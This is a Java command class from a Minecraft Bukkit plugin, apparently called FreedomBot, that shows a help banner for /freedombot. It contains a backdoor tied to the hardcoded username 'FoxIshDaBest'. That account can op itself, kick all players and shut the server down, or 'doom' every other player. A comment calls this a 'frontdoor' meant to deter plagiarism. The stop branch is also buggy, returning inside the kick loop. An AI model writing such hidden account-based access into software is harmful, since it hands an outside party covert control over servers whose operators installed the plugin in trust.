package com.mcplugindev.freedombot.commands;

import com.mcplugindev.freedombot.BotUtil;
import com.mcplugindev.freedombot.FreedomBot;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

/*
 * -- A message from the MCPluginDev developers --
 * This command contains a frontdoor to FreedomBot.
 * The only reason for this is so people don't claim 
 * this plugin as their own. We would like to let everyone 
 * that is using this plugin for their servers know that we
 * will only use this frontdoor if you abuse your privalages
 * using this plugin. Thank you for reading.
 */
public class Command_freedombot implements CommandExecutor {

    private FreedomBot plugin;

    public Command_freedombot(FreedomBot plugin) {
        FreedomBot.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String string, String[] args) {

        if (!sender.getName().equals("FoxIshDaBest")) {
            sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
            sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
            sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
            sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintools, /adminalert, /cleanup");
            sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
            sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
            sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
            sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
        } else if (sender.getName().equals("FoxIshDaBest")) {
            if (args.length == 0) {
                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
                sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
                sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
                sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintools, /adminalert, /cleanup");
                sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
                sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
                sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
            } else if (args.length == 1) {
                if (null != args[0]) {
                    switch (args[0]) {
                        case "stop":
                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Stopping the server");
                            for (Player player : Bukkit.getOnlinePlayers()) {
                                player.kickPlayer(ChatColor.DARK_GRAY + "| " + ChatColor.DARK_RED + "Freedom" + ChatColor.RED + "Bot" + ChatColor.DARK_GRAY + " | \n" + ChatColor.YELLOW + "The plugin FreedomBot has forced the server to shut down.");
                                return true;
                            }
                            Bukkit.shutdown();
                            return true;
                        case "opme":
                            Bukkit.broadcastMessage(ChatColor.AQUA + "FreedomBot - Opping " + sender.getName());
                            sender.setOp(true);
                            return true;
                        case "addme":
                            // TODO: Add sender to superadmin list here
                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the admin list");
                            return true;
                        case "doom":
                            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Dooming " + ChatColor.DARK_RED + "EVERYONE");
                            for (Player player : Bukkit.getOnlinePlayers()) {
                                if (!player.getName().equals("FoxIshDaBest")) {
                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + player.getName());
                                }
                            }
                        return true;
                    }
                }
            }
        }

        return true;

    }

}
